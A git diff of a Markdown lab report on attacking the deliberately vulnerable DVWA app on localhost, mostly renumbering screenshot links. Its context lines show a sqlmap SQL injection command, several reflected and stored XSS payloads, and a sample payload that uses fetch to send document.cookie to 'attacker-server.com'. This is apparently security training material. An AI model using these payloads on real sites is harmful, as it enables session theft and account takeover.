@@ -179,6 +179,9 @@ sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="
 | Time-based blind | Uses response delays to infer data |
 | UNION query | Combines results with attacker-controlled queries |
 
+![screenshot](./screenshots/Screenshot10.png)
+
+
 **Tables in dvwa Database:**
 - `guestbook`
 - `users`
@@ -216,17 +219,17 @@ The `?` is a safe placeholder. The database knows whatever goes there is just da
 <script>alert('XSS')</script>
 ```
 
-![screenshot](./screenshots/Screenshot10.png)
+![screenshot](./screenshots/Screenshot13.png)
 
 **Result:** A JavaScript alert popup appeared with the message "XSS".
 
-![screenshot](./screenshots/Screenshot11.png)
+![screenshot](./screenshots/Screenshot14.png)
 
 **Result:** The image failed to load, triggering the `onerror` event and showing the alert.
 
 **Conclusion:** The application takes the "name" parameter from the URL and echoes it directly into the HTML page without encoding. The browser sees `<script>` tags and executes them as code instead of displaying them as text.
 
-![screenshot](./screenshots/Screenshot12.png)
+![screenshot](./screenshots/Screenshot15.png)
 
 ### 3.2 Stored XSS
 
@@ -235,11 +238,11 @@ The `?` is a safe placeholder. The database knows whatever goes there is just da
 <script>alert('Stored XSS')</script>
 ```
 
-![screenshot](./screenshots/Screenshot13.png)
+![screenshot](./screenshots/Screenshot16.png)
 
 **Result:** After submitting, the alert executed immediately. When refreshing the page, the alert is executed again, proving the payload is stored in the database.
 
-![screenshot](./screenshots/Screenshot14.png)
+![screenshot](./screenshots/Screenshot17.png)
 
 **Real-world impact examples:**
 - An attacker could steal session cookies using `document.cookie` and send them to an external server.
@@ -257,15 +260,15 @@ javascript:alert('XSS')
 
 **Conclusion:** The developer only blocked simple `<script>` tags but didn't consider other HTML tags (like `<img>`, `<svg>`, `<body>`) that can also execute JavaScript via event handlers like `onerror` and `onload`.
 
-![screenshot](./screenshots/Screenshot15.png)
+![screenshot](./screenshots/Screenshot18.png)
 
-![screenshot](./screenshots/Screenshot16.png)
+![screenshot](./screenshots/Screenshot19.png)
 
 ```html
 <img src=x onerror=alert('XSS')>
 ```
 
-![screenshot](./screenshots/Screenshot17.png)
+![screenshot](./screenshots/Screenshot20.png)
 
 ```javascript
 javascript:alert('XSS')
@@ -280,7 +283,7 @@ These contain JSON payloads used for login attempts, creating accounts, sending 
 <script>alert('Your cookie is: ' + document.cookie)</script>
 ```
 
-![screenshot](./screenshots/Screenshot18.png)
+![screenshot](./screenshots/Screenshot21.png)
 
 **Result:** The alert displayed `PHPSESSID=hf9gjtg4ds75t9cte4eccfd726; security=low`.
 
@@ -289,7 +292,7 @@ In a real attack, the payload would be:
 <script>fetch('https://attacker-server.com/steal?cookie=' + document.cookie);</script>
 ```
 
-![screenshot](./screenshots/Screenshot19.png)
+![screenshot](./screenshots/Screenshot22.png)
 
 This sends the victim's cookie to the attacker's server. The attacker can then use that cookie to impersonate the victim.
 
